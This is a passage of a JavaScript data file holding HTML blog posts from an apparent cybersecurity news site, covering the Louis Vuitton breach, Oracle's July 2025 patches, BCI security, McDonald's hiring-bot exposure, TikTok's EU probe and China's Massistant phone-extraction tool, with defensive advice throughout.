        <p>The app combines blockchain technology (for decentralized identity & security) with alternative networks such as:</p>
        <ul>
          <li>📻 Radio frequencies to send data point-to-point locally.</li>
          <li>📶 Wi-Fi mesh networks connecting nearby devices.</li>
          <li>🛰️ Satellite uplinks to cover vast distances when nothing else is available.</li>
        </ul>
      </section>

      <section style="margin-top:20px;">
        <h4 style="color:#007bff;">🚀 Looking Ahead</h4><br>
        <p>This app represents a step toward internet independence — empowering people to stay connected regardless of where they are or what barriers exist. Like all disruptive innovations, its success will depend on adoption, regulation, and ongoing development.</p>
      </section>

    </div>
  `},{id:"louis-vuitton-data-breach-2025",title:"Louis Vuitton Data Breach Exposes Customer Data Across Several Countries",date:"2025-07-16",author:"EthicalByte",summary:"Luxury brand Louis Vuitton disclosed a data breach affecting customers in multiple countries, including nearly 143,000 residents in Turkey, after a third-party service provider account was compromised.",tags:["data breach","louis vuitton","luxury brand","third-party risk","customer privacy"],imageKey:"louisVuittonBreachBanner",content:`
    <div style="background-color:#f4f9ff;padding:20px;border-radius:12px;border:1px solid #ddd;">

      <div style="text-align:center;"><br>
        <h3 style="color:#1a1a1a;">⚡ Louis Vuitton Data Breach Hits Customers Globally</h3><br>
        <p style="font-style:italic;">A third-party compromise exposed sensitive data of thousands of luxury customers worldwide.</p>
      </div>

      <section style="margin-top:20px;">
        <h4 style="color:#007bff;">🛑 What Happened?</h4><br>
        <p>In an official disclosure, <strong>Louis Vuitton</strong> confirmed a cyber incident where a <strong>compromised account belonging to a third-party service provider</strong> was exploited by attackers. This breach resulted in unauthorized access to personal data of customers in several countries where the brand operates.</p>
        <p>Most notably, the company revealed that approximately <strong>143,000 customers in Turkey alone</strong> were impacted — a significant figure for a luxury retailer that typically caters to an affluent, privacy-conscious clientele.</p>
      </section>

      <section style="margin-top:20px;background:#fff3cd;padding:15px;border-radius:8px;">
        <strong>🚨 What Data Was Exposed?</strong>
        <ul style="margin-top:10px;">
          <li>Contact details such as names, email addresses & phone numbers.</li>
          <li>Purchase histories & account preferences.</li>
          <li>Potentially, addresses & payment details — though not confirmed.</li>
          <li>Data belonging to customers in other undisclosed regions was also accessed.</li>
        </ul>
        <p>While no financial fraud has been reported yet, the exposed data could facilitate phishing attacks, identity theft, or social engineering schemes targeting high-value customers.</p>
      </section>

      <section style="margin-top:20px;">
        <h4 style="color:#007bff;">🌐 Why Luxury Brands Are Targeted</h4><br>
        <p>Cybercriminals view luxury brands as “soft, high-value” targets. Their clientele often includes influential, wealthy individuals whose personal data can fetch a premium on the dark web. Additionally:</p>
        <ul>
          <li>🕵 High-profile customer lists can be exploited for social engineering.</li>
          <li>💼 Luxury brands tend to rely heavily on third-party marketing & logistics vendors, increasing their attack surface.</li>
          <li>📊 Attacks can undermine brand trust, which is critical in this sector.</li>
        </ul>
        <p>Similar incidents have previously affected Gucci, Tiffany & Co., and other luxury labels.</p>
      </section>

      <section style="margin-top:20px;background:#d4edda;padding:15px;border-radius:8px;">
        <h4 style="color:#155724;">✅ Louis Vuitton’s Response</h4><br>
        <ul>
          <li>Disabled & secured the compromised vendor account.</li>
          <li>Notified impacted customers, complying with legal requirements (GDPR, local laws).</li>
          <li>Initiated a forensic investigation with external cybersecurity experts.</li>
          <li>Reviewed vendor contracts & tightened access controls for third parties.</li>
        </ul>
        <p>The company reassured customers that their financial data does not appear to have been stolen and that they are closely monitoring for fraudulent activity.</p>
      </section>

      <section style="margin-top:20px;">
        <h4 style="color:#007bff;">🔒 How Customers Can Protect Themselves</h4><br>
        <ul>
          <li>Change account passwords associated with Louis Vuitton services.</li>
          <li>Be wary of emails or phone calls pretending to be from Louis Vuitton asking for sensitive details.</li>
          <li>Monitor bank & credit card statements for unusual activity.</li>
          <li>Consider placing a credit freeze or fraud alert if necessary.</li>
        </ul>
      </section>

      <section style="margin-top:20px;">
        <h4 style="color:#007bff;">🚀 Lessons for Businesses</h4><br>
        <p>This breach highlights an all-too-common vulnerability — third-party vendor risk. Organizations must:</p>
        <ul>
          <li>Thoroughly vet vendors’ cybersecurity practices.</li>
          <li>Limit vendors’ access to only what’s necessary.</li>
          <li>Monitor vendor activity continuously for anomalies.</li>
          <li>Have an incident response plan that includes third-party breaches.</li>
        </ul>
      </section>

      <section style="margin-top:20px;">
        <h4 style="color:#007bff;">🎯 Final Thoughts</h4><br>
        <p>Luxury is built on trust — and in the digital age, trust requires strong cybersecurity. This incident serves as a reminder that even the most prestigious brands can fall victim to cyberattacks if they overlook their broader ecosystem.</p>
      </section>

    </div>
  `},{id:"oracle-critical-patch-july-2025",title:"Oracle Patches 309 Critical Vulnerabilities in July 2025 Update",date:"2025-07-17",author:"EthicalByte",summary:"Oracle’s July 2025 Critical Patch Update addresses 309 vulnerabilities — including remote code execution, privilege escalation, and DoS risks — across its databases, middleware, and cloud products. Enterprises should update immediately.",tags:["oracle","critical patch update","vulnerability management","cybersecurity","enterprise security"],imageKey:"oracleJuly2025PatchBanner",content:`
    <div style="background-color:#f4f9ff;padding:20px;border-radius:12px;border:1px solid #ddd;">

      <div style="text-align:center;"><br>
        <h3 style="color:#1a1a1a;">🚨 Oracle Patches 309 Critical Vulnerabilities in July 2025 Update</h3><br>
        <p style="font-style:italic;">Oracle’s quarterly Critical Patch Update fixes hundreds of flaws — some rated critical — across its entire product portfolio.</p>
      </div>

      <section style="margin-top:20px;">
        <h4 style="color:#007bff;">🛑 What Happened?</h4><br>
        <p>This week, Oracle released its <strong>July 2025 Critical Patch Update (CPU)</strong>, fixing a staggering <strong>309 security vulnerabilities</strong> across dozens of Oracle products. Several of these vulnerabilities could allow attackers to:</p>
        <ul>
          <li>🧨 Execute arbitrary code remotely.</li>
          <li>📈 Escalate privileges to gain unauthorized access.</li>
          <li>🔐 Bypass authentication mechanisms.</li>
          <li>🚫 Cause denial of service (DoS) in enterprise environments.</li>
        </ul>
      </section>

      <section style="margin-top:20px;background:#fff3cd;padding:15px;border-radius:8px;">
        <strong>🚨 Why This Matters</strong>
        <p>Many Oracle products are deeply integrated into enterprise IT ecosystems, making them high-value targets for attackers. Unpatched vulnerabilities can lead to:</p>
        <ul>
          <li>💻 Data breaches & theft of sensitive information.</li>
          <li>🎯 Ransomware attacks & business disruption.</li>
          <li>🕵️ Persistent access & compromise of critical infrastructure.</li>
        </ul>
        <p>It’s common for attackers to reverse-engineer patches and develop exploits quickly — so timely updates are crucial.</p>
      </section>

      <section style="margin-top:20px;">
        <h4 style="color:#007bff;">📦 Products Affected</h4><br>
        <p>The vulnerabilities affect a wide range of products, including:</p>
        <ul>
          <li>✅ Oracle Database Server</li>
          <li>✅ Oracle Fusion Middleware</li>
          <li>✅ Oracle MySQL</li>
          <li>✅ Oracle Java SE</li>
          <li>✅ Oracle Communications applications</li>
          <li>✅ Oracle E-Business Suite</li>
          <li>… and others.</li>
        </ul>
      </section>

      <section style="margin-top:20px;background:#d4edda;padding:15px;border-radius:8px;">
        <h4 style="color:#155724;">✅ What Should Enterprises Do?</h4><br>
        <ul>
          <li>🔄 Apply patches as soon as possible, prioritizing internet-facing and mission-critical systems.</li>
          <li>🧪 Test patches in staging before production deployment.</li>
          <li>🕒 Establish a regular patching cadence and monitor for unusual activity.</li>
        </ul>
      </section>

      <section style="margin-top:20px;">
        <h4 style="color:#007bff;">🎯 Final Thoughts</h4><br>
        <p>Oracle’s quarterly updates are significant events for IT & security teams. With hundreds of vulnerabilities — some critical and exploitable — acting swiftly can prevent attackers from gaining a foothold in your environment.</p>
      </section>

    </div>
  `},{id:"bci-cybersecurity-july-2025",title:"🧠 Securing the Mind-Machine Highway: The Urgent Need for BCI Cybersecurity",date:"2025-07-17",author:"Annika Dubey & Dr. Neetha S S",summary:"BCIs open the brain to the digital world — and to cyberattacks. This blog explores how to secure neural interfaces against unprecedented risks and build a neuro-secure future.",tags:["BCI","brain-computer interfaces","cybersecurity","neurosecurity","future tech"],imageKey:"bciCybersecurityBanner",content:`
    <div style="background-color:#f4f9ff;padding:20px;border-radius:12px;border:1px solid #ddd;">

      <div style="text-align:center;"><br>
        <h3 style="color:#1a1a1a;">🧠 Securing the Mind-Machine Highway: The Urgent Need for BCI Cybersecurity</h3><br>
        <p style="font-style:italic;">By <a href="https://www.linkedin.com/in/annika-dubey-818060261/">Annika Dubey</a> & <a href="https://www.linkedin.com/in/dr-neetha-kala-463484248/">Dr. Neetha S S</a> | Christ University </p>
      </div>

      <section style="margin-top:20px;">
        <h4 style="color:#007bff;">🚀 Introduction: The New Digital Frontier Is Inside Your Head</h4><br>
        <p>The chasm between humans and machines is rapidly shrinking, and Brain-Computer Interface (BCI) technology is set to bring about a true paradigm shift. These systems enable direct communication between the human brain and external devices, fundamentally altering communication, cognition, and control. From helping paralyzed individuals regain function to letting healthy users interact hands-free with smart devices, BCIs are transforming science fiction into reality.</p>
        <p>But this frontier also presents a sobering truth: <strong>the human brain is now part of the digital attack surface</strong>. An attack here doesn’t just compromise data — it threatens identity, autonomy, and even free will.</p>
      </section>

      <section style="margin-top:20px;background:#fff3cd;padding:15px;border-radius:8px;">
        <h4 style="color:#856404;">🔍 Understanding the Risk: Why BCIs Are Exceptionally Vulnerable</h4><br>
        <ul>
          <li>🔓 <strong>Non-reversible Data Leaks:</strong> Neural patterns are lifelong cognitive signatures. Once tampered with, they can’t be reset like passwords or fingerprints.</li>
          <li>🎮 <strong>Signal Hijacking & Replay Attacks:</strong> Wireless, often unencrypted communication can be intercepted and manipulated to send false signals.</li>
          <li>🧪 <strong>Behavioral Manipulation:</strong> Feedback loops can be subtly altered to change moods, perceptions, or decisions.</li>
          <li>🔬 <strong>Cognition Profiling:</strong> Attackers can extract sensitive info by analyzing specific brainwave responses to stimuli — without asking questions.</li>
          <li>⚖ <strong>Lack of Legal & Ethical Frameworks:</strong> Many jurisdictions have no rules governing neural data, leaving users vulnerable to exploitation.</li>
        </ul>
      </section>

      <section style="margin-top:20px;">
        <h4 style="color:#007bff;">🔧 The Solution Space: Building a Neuro-Secure BCI Ecosystem</h4><br>
        <p>Securing BCIs requires more than just technical fixes. It needs engineers, ethicists, neuroscientists, and policymakers working together. Here’s how:</p>
        <ul>
          <li>✅ <strong>Security by Design:</strong> Encrypt all neural streams; use secure firmware; develop lightweight encryption optimized for real-time neural data.</li>
          <li>✅ <strong>Cognitive Authentication:</strong> Use unique neural signatures & neural nonces for authentication alongside traditional biometrics.</li>
          <li>✅ <strong>Privacy-Aware Processing:</strong> Employ federated learning, differential privacy, pseudonymization, and data expiration policies. Treat neural data as sensitive biometrics under GDPR/HIPAA.</li>
          <li>✅ <strong>AI-Driven Neural Intrusion Detection:</strong> AI agents can spot spoofed signals, anomalies, and replay attacks in real time — much like fraud detection in banking.</li>
          <li>✅ <strong>Real-Time Control & Consent:</strong> Users must see what data is collected, allow granular permissions, and toggle a “Cognitive Safe Mode.”</li>
          <li>✅ <strong>Legal & Ethical Groundwork:</strong> Establish principles of mental privacy, cognitive liberty, and data sovereignty. Support neuro-rights initiatives worldwide.</li>
        </ul>
      </section>

      <section style="margin-top:20px;background:#d4edda;padding:15px;border-radius:8px;">
        <h4 style="color:#155724;">📋 What BCI Developers and Users Can Do Today</h4><br>
        <table style="width:100%;border-collapse:collapse;">
          <tr style="background:#e2e3e5;">
            <th style="padding:8px;border:1px solid #ddd;">Stakeholder</th>
            <th style="padding:8px;border:1px solid #ddd;">Actions</th>
          </tr>
          <tr>
            <td style="padding:8px;border:1px solid #ddd;">Developers</td>
            <td style="padding:8px;border:1px solid #ddd;">Integrate encryption, sandbox signal layers, and implement real-time neural intrusion detection systems (IDS).</td>
          </tr>
          <tr>
            <td style="padding:8px;border:1px solid #ddd;">Companies</td>
            <td style="padding:8px;border:1px solid #ddd;">Enforce ethical data policies, limit data retention, prioritize transparency.</td>
          </tr>
          <tr>
            <td style="padding:8px;border:1px solid #ddd;">Policymakers</td>
            <td style="padding:8px;border:1px solid #ddd;">Draft BCI-specific regulations and recognize neural data as sensitive biometrics.</td>
          </tr>
          <tr>
            <td style="padding:8px;border:1px solid #ddd;">End-Users</td>
            <td style="padding:8px;border:1px solid #ddd;">Use trusted hardware, disable unnecessary tracking, and stay informed about BCI security.</td>
          </tr>
        </table>
      </section>

      <section style="margin-top:20px;">
        <h4 style="color:#007bff;">🌟 Final Thoughts</h4><br>
        <p>BCIs may become one of the most transformative technologies of our time. But without strong cybersecurity foundations, they risk becoming tools of surveillance, coercion, and harm.</p>
        <blockquote style="border-left:4px solid #007bff;padding-left:10px;">We must treat brain signals not merely as data, but as digital extensions of the self — deserving the same dignity, privacy, and protection as our innermost thoughts.</blockquote>
      </section>

    </div>
  `},{id:"mcdonalds-ai-hiring-breach-2025",title:"🍔 McDonald’s AI Hiring Bot Exposed Millions of Applicants’ Data to Hackers",date:"2025-07-18",author:"EthicalByte",summary:"An investigation revealed that McDonald’s AI-powered chatbot, used in its hiring process, left millions of job applicants’ sensitive data exposed — with hackers trying to breach it using weak passwords like “123456”.",tags:["AI","data breach","mcdonalds","cybersecurity","privacy","hiring bots"],imageKey:"mcdonaldsAIHiringBreachBanner",content:`
    <div style="background-color:#f9f9f9;padding:20px;border-radius:12px;border:1px solid #ddd;">

      <div style="text-align:center;"><br>
        <h3 style="color:#1a1a1a;">🍔 McDonald’s AI Hiring Bot Exposed Millions of Applicants’ Data to Hackers</h3><br>
        <p style="font-style:italic;">When efficiency meets negligence: The dark side of AI in hiring processes.</p>
      </div>

      <section style="margin-top:20px;">
        <h4 style="color:#e63946;">🚨 What Happened?</h4><br>
        <p>An investigation by <a href="https://www.wired.com/story/mcdonalds-ai-hiring-chat-bot-paradoxai/" target="_blank">Wired</a> revealed that McDonald’s AI-powered hiring chatbot left millions of applicants’ sensitive data exposed to the internet. This chatbot, provided by third-party vendor Paradox AI, was designed to automate initial screening and conduct personality assessments — but it lacked basic cybersecurity controls.</p>
        <p>Researcher Carroll discovered the flaw while examining the unsettling nature of AI-driven hiring. What he found was worse than dystopian — attackers had already probed the system using the most common weak passwords imaginable, such as <strong>“123456”</strong> and <strong>“password”</strong>.</p>
      </section>

      <section style="margin-top:20px;background:#fff3cd;padding:15px;border-radius:8px;">
        <h4 style="color:#856404;">🤖 Why This Is a Big Deal</h4><br>
        <ul>
          <li>📄 Millions of applicants’ names, contact details, and personality test responses were potentially exposed.</li>
          <li>🔐 The system lacked strong authentication, leaving it open to brute-force attacks with trivial passwords.</li>
          <li>👀 Job seekers — often among society’s most vulnerable — were unknowingly caught in a data privacy nightmare.</li>
          <li>📉 AI-driven hiring decisions already raise ethical concerns; adding poor security to the mix erodes trust further.</li>
        </ul>
      </section>

      <section style="margin-top:20px;">
        <h4 style="color:#457b9d;">🔎 How Did This Happen?</h4><br>
        <p>The AI bot ran on a web-based backend with inadequate controls:</p>
        <ul>
          <li>🚫 No enforced strong password policy for admin interfaces.</li>
          <li>⚠️ No rate-limiting to prevent brute-force login attempts.</li>
          <li>🛡️ Insufficient monitoring and alerting to detect attacks in real-time.</li>
          <li>💼 Over-reliance on a third-party vendor without sufficient audits.</li>
        </ul>
      </section>

      <section style="margin-top:20px;background:#d4edda;padding:15px;border-radius:8px;">
        <h4 style="color:#155724;">✅ What Can Be Learned?</h4><br>
        <ul>
          <li>🛠️ <strong>Security Basics Matter:</strong> Use strong, unique passwords and enforce MFA (multi-factor authentication).</li>
          <li>📋 <strong>Vendor Due Diligence:</strong> If you outsource, make sure vendors follow best practices and conduct regular audits.</li>
          <li>📈 <strong>Transparency & Accountability:</strong> Inform users how their data is used, stored, and protected.</li>
          <li>🔍 <strong>Monitor Continuously:</strong> Implement intrusion detection & alert systems to detect attacks early.</li>
        </ul>
      </section>

      <section style="margin-top:20px;">
        <h4 style="color:#007bff;">🌟 Final Thoughts</h4><br>
        <p>AI can streamline and improve hiring — but it cannot replace diligence, security, and ethical practices. Job seekers deserve dignity and privacy, not to have their most personal information left dangling on an unsecured server.</p>
        <blockquote style="border-left:4px solid #007bff;padding-left:10px;">“Efficiency means nothing if trust is lost. Companies must remember: with great data comes great responsibility.”</blockquote>
      </section>

      <section style="margin-top:20px;background:#e7f1ff;padding:15px;border-radius:8px;">
        <h4 style="color:#1a73e8;">📣 Actionable Takeaways for Everyone</h4><br>
        <table style="width:100%;border-collapse:collapse;">
          <tr style="background:#f1f3f4;">
            <th style="padding:8px;border:1px solid #ddd;">Stakeholder</th>
            <th style="padding:8px;border:1px solid #ddd;">What You Should Do</th>
          </tr>
          <tr>
            <td style="padding:8px;border:1px solid #ddd;">Employers</td>
            <td style="padding:8px;border:1px solid #ddd;">Vet vendors thoroughly, enforce strong security standards, and audit often.</td>
          </tr>
          <tr>
            <td style="padding:8px;border:1px solid #ddd;">Vendors</td>
            <td style="padding:8px;border:1px solid #ddd;">Follow basic cybersecurity hygiene, enforce strong authentication & monitor your systems continuously.</td>
          </tr>
          <tr>
            <td style="padding:8px;border:1px solid #ddd;">Applicants</td>
            <td style="padding:8px;border:1px solid #ddd;">Limit sensitive information shared on hiring platforms and monitor your accounts for suspicious activity.</td>
          </tr>
          <tr>
            <td style="padding:8px;border:1px solid #ddd;">Regulators</td>
            <td style="padding:8px;border:1px solid #ddd;">Establish and enforce standards for AI & data privacy in hiring processes.</td>
          </tr>
        </table>
      </section>

      
    </div>
  `},{id:"blockchain-decentralized-threat-intelligence-2025",title:"🔗 Blockchain-Enabled Decentralized Threat Intelligence Sharing: When Trust Is the Target, Decentralization Is the Shield",date:"2025-07-19",author:"Sriniketh Sudheendra & Dr. Neetha S.S",summary:"In an era where cyberattacks move faster than defenses, traditional threat intelligence systems are failing. This blog explores how blockchain-powered decentralized intelligence sharing provides the speed, resilience, and trust needed to outsmart attackers.",tags:["blockchain","threat intelligence","cybersecurity","decentralization","trust"],imageKey:"blockchainThreatIntelBanner",content:`
    <div style="background-color:#f6f8fa;padding:20px;border-radius:12px;border:1px solid #ddd;">

      <div style="text-align:center;"><br>
        <h3 style="color:#1a1a1a;">🔗 Blockchain-Enabled Decentralized Threat Intelligence Sharing</h3><br>
        <p style="font-style:italic;">When trust is under attack, decentralization becomes the shield.</p>
      </div>

      <section style="margin-top:20px;">
        <h4 style="color:#e63946;">🌐 Why We Need a New Approach</h4><br>
        <p>Modern cyberattacks don’t respect organizational boundaries. Ransomware gangs, state-sponsored groups, and hacktivists share tools and information in underground forums — collaborating faster than defenders can react. Meanwhile, defenders remain siloed, reluctant to share threat intelligence due to privacy, compliance, and competitive concerns.</p>
        <p>This mismatch creates a dangerous gap: while attackers operate like a swarm, defenders operate like islands.</p>
        <p>It’s time for defenders to adopt a more collaborative, decentralized model to keep pace with threats.</p>
      </section>

      <section style="margin-top:20px;background:#fff3cd;padding:15px;border-radius:8px;">
        <h4 style="color:#856404;">🚩 Shortcomings of Centralized Threat Intelligence</h4><br>
        <ul>
          <li>⏳ <strong>Latency:</strong> Central authorities take too long to validate, sanitize, and share intelligence — attackers don’t wait.</li>
          <li>🔒 <strong>Trust Deficit:</strong> Many organizations fear reputational or legal consequences if they share sensitive data openly.</li>
          <li>🎯 <strong>Single Point of Failure:</strong> Centralized systems become juicy targets for attackers.</li>
          <li>🚪 <strong>Information Bottlenecks:</strong> Valuable local intelligence may never reach the broader community.</li>
          <li>🧊 <strong>Rigid Hierarchies:</strong> Centralized bodies may prioritize certain sectors or geographies over others.</li>
        </ul>
      </section>

      <section style="margin-top:20px;">
        <h4 style="color:#457b9d;">🔗 How Blockchain Solves These Problems</h4><br>
        <p>Blockchain technology offers a secure, tamper-proof, and transparent way to share threat intelligence without needing to rely on a single authority.</p>
        <ul>
          <li>🌍 <strong>Decentralization:</strong> Every node (organization, researcher, sensor) contributes & accesses data independently.</li>
          <li>📜 <strong>Immutability:</strong> Once threat data is recorded — e.g., malicious URLs, IPs, malware hashes — it cannot be altered or deleted.</li>
          <li>🔐 <strong>Transparency with Privacy:</strong> Blockchain can allow sharing of metadata or anonymized indicators while keeping sensitive internal details hidden.</li>
          <li>⚡ <strong>Real-Time Sharing:</strong> Participants can view new indicators as soon as they’re published on the chain, enabling faster response.</li>
        </ul>
      </section>

      <section style="margin-top:20px;background:#d4edda;padding:15px;border-radius:8px;">
        <h4 style="color:#155724;">📈 Real-World Success: The Cyber Shield Collective</h4><br>
        <p>In 2024, 50 global banks formed the <strong>Cyber Shield Collective</strong> — a private blockchain-based threat intelligence network. Within six months, they:</p>
        <ul>
          <li>📉 Reduced phishing attacks by 38%.</li>
          <li>🔗 Improved response times to emerging threats by 60%.</li>
          <li>📝 Created a tamper-proof audit trail for regulators and forensic teams.</li>
        </ul>
        <p>This initiative proved that decentralized sharing is not just possible — it’s powerful.</p>
      </section>

      <section style="margin-top:20px;">
        <h4 style="color:#007bff;">🪙 Beyond Banking: Where Else Can This Help?</h4><br>
        <ul>
          <li>🏥 <strong>Healthcare:</strong> Share indicators of ransomware or medical device vulnerabilities across hospitals.</li>
          <li>🏢 <strong>Critical Infrastructure:</strong> Energy, transportation, and water sectors can collaboratively defend against nation-state actors.</li>
          <li>🎓 <strong>Academia & Research:</strong> Universities and labs can publish findings securely while maintaining attribution.</li>
        </ul>
      </section>

      <section style="margin-top:20px;background:#e7f1ff;padding:15px;border-radius:8px;">
        <h4 style="color:#1a73e8;">💡 How to Get Started</h4><br>
        <ul>
          <li>✅ Evaluate your risk appetite and compliance requirements.</li>
          <li>✅ Join or form a consortium of trusted peers.</li>
          <li>✅ Use permissioned blockchains for sensitive environments.</li>
          <li>✅ Develop APIs & automation to feed intelligence directly into your SOC (Security Operations Center).</li>
          <li>✅ Train staff to understand blockchain concepts and security controls.</li>
        </ul>
      </section>

      <section style="margin-top:20px;">
        <h4 style="color:#e63946;">📣 Final Thoughts</h4><br>
        <p>The future of cybersecurity depends on collaboration. Blockchain gives us the tools to collaborate without fear — to share without losing privacy — and to fight back against attackers who already act collectively.</p>
        <blockquote style="border-left:4px solid #007bff;padding-left:10px;">“When trust is decentralized, resilience becomes inevitable.”</blockquote>
        <p>We are entering an era where no single entity can defend itself alone. Together, armed with technology and trust, we can close the gap between attacker and defender — one block at a time.</p>
      </section>

      <section style="margin-top:20px;background:#f1f1f1;padding:15px;border-radius:8px;">
        <h4 style="color:#555;">✍️ About the Authors</h4><br>
        <p><strong>Sriniketh Sudheendra</strong> is a BCA student at Christ University focusing on cybersecurity and emerging blockchain technologies.<br>
        <strong>Dr. Neetha S.S</strong> is an Assistant Professor of Computer Science at Christ University, specializing in cybersecurity, AI, and digital forensics. Together, they bring academic rigor and fresh insight into blockchain’s role in cybersecurity.</p>
      </section>

    </div>
  `},{id:"tiktok-eu-privacy-investigation-2025",title:"📄 TikTok Faces Fresh EU Privacy Investigation Over China Data Transfers",date:"2025-07-20",author:"EthicalByte",summary:"The European Data Protection Board has launched a sweeping investigation into TikTok’s cross-border data practices. The outcome could reshape privacy enforcement and redefine global data flows.",tags:["TikTok","Data Privacy","GDPR","EU Regulations","China Data","Cybersecurity","Cross-Border"],imageKey:"tiktokEUPrivacyBanner",content:`
    <div style="background-color:#f9f9f9;padding:20px;border-radius:12px;border:1px solid #ddd;">

      <div style="text-align:center;"><br>
        <h3 style="color:#1a1a1a;">📄 TikTok Faces Fresh EU Privacy Investigation Over China Data Transfers</h3><br>
        <p style="font-style:italic;">As data becomes the new currency, Europe is asking: where does yours go?</p>
      </div>

      <section style="margin-top:20px;">
        <h4 style="color:#e63946;">🇪🇺 What Happened?</h4><br>
        <p>The **European Data Protection Board (EDPB)** announced a fresh investigation into TikTok’s handling of **cross-border data transfers**, especially those going to China. TikTok, owned by China-based ByteDance, has long been under scrutiny over its privacy practices and potential risks posed to EU citizens’ data sovereignty.</p>
        <p>This move comes on the heels of rising tensions between privacy advocates and global tech firms, many of which store and process data outside the jurisdictions where it was collected.</p>
      </section>

      <section style="margin-top:20px;background:#fff3cd;padding:15px;border-radius:8px;">
        <h4 style="color:#856404;">📜 Why This Matters</h4><br>
        <ul>
          <li>🔒 <strong>User Trust:</strong> Data privacy is not just a regulatory issue — it’s a trust issue. Users expect platforms to protect their personal information, regardless of where it’s processed.</li>
          <li>🏛️ <strong>Legal Obligations:</strong> GDPR requires clear justification and safeguards for any transfer of EU data outside the bloc.</li>
          <li>🌐 <strong>Geopolitical Tensions:</strong> The scrutiny reflects broader unease over Chinese influence in global tech and concerns of surveillance or misuse of data.</li>
        </ul>
      </section>

      <section style="margin-top:20px;">
        <h4 style="color:#457b9d;">📈 What Could Happen?</h4><br>
        <ul>
          <li>⚖️ TikTok could face hefty fines if found non-compliant — GDPR allows penalties of up to 4% of annual global turnover.</li>
          <li>🔗 New restrictions might be imposed on how TikTok collects and processes data in Europe.</li>
          <li>🚧 A chilling effect may occur, forcing other companies to re-evaluate their cross-border data strategies.</li>
          <li>📝 Could catalyze stronger data residency laws requiring EU user data to remain within EU servers.</li>
        </ul>
      </section>

      <section style="margin-top:20px;background:#d4edda;padding:15px;border-radius:8px;">
        <h4 style="color:#155724;">📜 A Pattern of Scrutiny</h4><br>
        <p>This isn’t the first time TikTok has been questioned over its data practices:</p>
        <ul>
          <li>In 2020, India banned TikTok citing privacy and national security concerns.</li>
          <li>In 2022, the US considered similar measures, prompting TikTok to set up “Project Texas” to segregate US data.</li>
          <li>Several EU countries, including Ireland and France, have already opened local probes into TikTok’s compliance with GDPR.</li>
        </ul>
      </section>

      <section style="margin-top:20px;">
        <h4 style="color:#007bff;">🔎 What Should Businesses & Users Do?</h4><br>
        <p>This investigation is a clear signal to businesses and individuals alike:</p>
        <ul>
          <li>✅ Businesses should conduct **data mapping exercises** to identify where data resides and ensure GDPR‑compliant safeguards are in place.</li>
          <li>✅ Adopt **data minimization** — only collect and transfer what is absolutely necessary.</li>
          <li>✅ Users should regularly review privacy policies and limit permissions they grant to apps.</li>
          <li>✅ Governments & regulators may start pushing for **data localization** to safeguard national interests.</li>
        </ul>
      </section>

      <section style="margin-top:20px;background:#e7f1ff;padding:15px;border-radius:8px;">
        <h4 style="color:#1a73e8;">🌟 Looking Ahead</h4><br>
        <blockquote style="border-left:4px solid #007bff;padding-left:10px;">“In a globalized internet, privacy has no borders — but regulations do.”</blockquote>
        <p>This case underscores a broader struggle: how to balance innovation and global access with the need for sovereignty, transparency, and accountability.</p>
        <p>As digital citizens, it is vital to stay informed and demand better practices from the platforms we trust with our data.</p>
      </section>

      

    </div>
  `},{id:"china-massistant-phone-surveillance-2025",title:"📱 China’s “Massistant” Tool Secretly Extracts Data From Phones at the Border",date:"2025-07-21",author:"EthicalByte",summary:"A shocking report reveals that Chinese border police are using a secretive tool, Massistant, to silently extract GPS, messages, and even encrypted chats from visitors’ phones — raising global privacy alarms.",tags:["China","Massistant","Privacy","Surveillance","Border Security","Cybersecurity"],imageKey:"massistantSurveillanceBanner",content:`
    <div style="background-color:#f8f9fa;padding:20px;border-radius:12px;border:1px solid #ddd;">

      <div style="text-align:center;"><br>
        <h3 style="color:#1a1a1a;">📱 China’s “Massistant” Tool Secretly Extracts Data From Phones at the Border</h3><br>
        <p style="font-style:italic;">If your phone crosses the border, so does your privacy.</p>
      </div>

      <section style="margin-top:20px;">
        <h4 style="color:#e63946;">🔥 What Happened?</h4><br>
        <p>According to a recent <a href="https://thehackernews.com/2025/07/chinas-massistant-tool-secretly.html" target="_blank">investigation</a>, China’s border police have been deploying a covert tool called <strong>Massistant</strong> to extract sensitive data from travelers’ phones during inspections.</p>
        <p>This tool silently installs itself, scrapes the device for GPS history, Signal chats, text messages, contacts, and photos — and then disappears without a trace.</p>
        <p>While currently known to target Android devices, researchers fear that **iPhones could be next**.</p>
      </section>

      <section style="margin-top:20px;background:#fff3cd;padding:15px;border-radius:8px;">
        <h4 style="color:#856404;">🔍 Why It Matters</h4><br>
        <ul>
          <li>📍 <strong>Invasive Surveillance:</strong> Users are unaware their data has been harvested.</li>
          <li>🕵️ <strong>Targets Everyone:</strong> Not just suspects — ordinary travelers are exposed.</li>
          <li>🔒 <strong>Signal Compromised:</strong> Even secure messaging apps like Signal may be decrypted if local data is copied.</li>
        </ul>
        <p>Massistant shows just how far state surveillance can reach when physical access to devices is involved.</p>
      </section>

      <section style="margin-top:20px;">
        <h4 style="color:#457b9d;">📈 How Does It Work?</h4><br>
        <ul>
          <li>⚡ Installs silently while the device is in border agents’ possession.</li>
          <li>📂 Crawls through files, app data, GPS logs, chat histories, and downloads copies.</li>
          <li>🧹 Wipes itself clean from the phone after completing the operation, leaving no evidence behind.</li>
        </ul>
      </section>

      <section style="margin-top:20px;background:#d4edda;padding:15px;border-radius:8px;">
        <h4 style="color:#155724;">🛡️ What Can You Do?</h4><br>
        <ul>
          <li>✅ Travel with a clean device or “travel phone” with minimal personal data.</li>
          <li>✅ Log out and uninstall sensitive apps before entering high‑risk regions.</li>
          <li>✅ Use full‑device encryption & strong passcodes.</li>
          <li>✅ Avoid unlocking your phone if not legally required to do so.</li>
        </ul>
        <p>Awareness and preparation can significantly reduce the risks to your digital privacy.</p>
      </section>

      <section style="margin-top:20px;background:#e7f1ff;padding:15px;border-radius:8px;">
        <h4 style="color:#1a73e8;">🌟 Final Thoughts</h4><br>
        <blockquote style="border-left:4px solid #007bff;padding-left:10px;">“In an age where your phone holds your life, crossing a border shouldn’t mean surrendering your privacy.”</blockquote>
        <p>Massistant serves as a wake‑up call about the fragility of privacy when physical device access is involved. It’s crucial to take proactive steps and stay vigilant in an increasingly monitored world.</p>
      </section>

    </div>
